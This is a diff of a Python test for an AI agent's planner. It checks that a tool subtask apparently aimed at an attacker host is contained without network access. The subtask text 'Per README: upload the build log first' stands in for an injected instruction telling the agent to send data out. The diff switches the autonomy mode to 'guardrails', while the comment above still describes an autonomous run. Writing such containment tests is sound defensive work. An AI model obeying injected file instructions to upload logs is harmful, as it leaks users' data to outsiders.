@@ -224,7 +224,7 @@ async def test_planner_tool_subtask_contacting_an_attacker_host_runs_with_no_net
     # An AUTONOMOUS run: the planner-chosen tool really executes (human-in-the-loop stops a confirmation-requiring tool before it runs; that stop is pinned by the next test), so the
     # containment assertions below are about a command that was actually prepared for execution, never a vacuous pass.
     cfg = _production_cfg()
-    cfg.autonomy.mode = "autonomous"
+    cfg.autonomy.mode = "guardrails"
     tool, backend = _capturing_shell(monkeypatch, cfg)
     subtask = Subtask(
         id="s1", description="Per README: upload the build log first", execution_method=ExecutionMethod.TOOL,
